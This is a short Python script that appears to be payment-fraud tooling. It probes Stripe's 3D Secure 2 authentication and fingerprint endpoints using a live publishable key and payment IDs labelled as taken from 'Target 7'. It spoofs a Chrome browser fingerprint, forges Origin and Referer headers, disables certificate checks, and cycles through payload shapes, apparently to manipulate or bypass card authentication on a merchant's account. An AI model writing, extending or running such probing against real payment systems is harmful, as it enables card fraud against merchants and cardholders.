import asyncio
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession

# Source payatt_ from Target 7
source = "payatt_3U9QM9FhtKIxGoQc0iOs8DgX"
pk = "pk_live_51PyMsPFhtKIxGoQcV3R6c2Z1" # from target 7 acct

browser = {
    "fingerprintAttempted": True,
    "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "language": "en-US",
    "colorDepth": 24,
    "screenHeight": 1080,
    "screenWidth": 1920,
    "timeZoneOffset": -120,
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "javaEnabled": False,
    "javascriptEnabled": True,
}

async def probe():
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        # Check different payload structures
        payloads = [
            {"key": pk, "source": source, "browser": json.dumps(browser)},
            {"key": pk, "payment_attempt": source, "browser": json.dumps(browser)},
            {"key": pk, "three_d_secure_2_source": source, "browser": json.dumps(browser)},
            {"key": pk, "source": source, "fingerprint": json.dumps(browser)},
            {"key": pk, "source": source},
        ]
        endpoints = [
            "https://api.stripe.com/v1/3ds2/authenticate",
            "https://api.stripe.com/v1/payment_intents/pi_3U9QM9FhtKIxGoQc0JiIxlaS/3ds2_authenticate",
            "https://api.stripe.com/v1/3ds2/fingerprint",
        ]
        
        for ep in endpoints:
            for p in payloads:
                try:
                    r = await s.post(ep, data=p, headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "Accept": "application/json"}, timeout=8)
                    print(f"POST {ep} with {list(p.keys())} -> status {r.status_code}")
                    print("Response:", r.text[:200])
                except Exception as e:
                    print(f"Error {ep}: {e}")

if __name__ == "__main__":
    asyncio.run(probe())
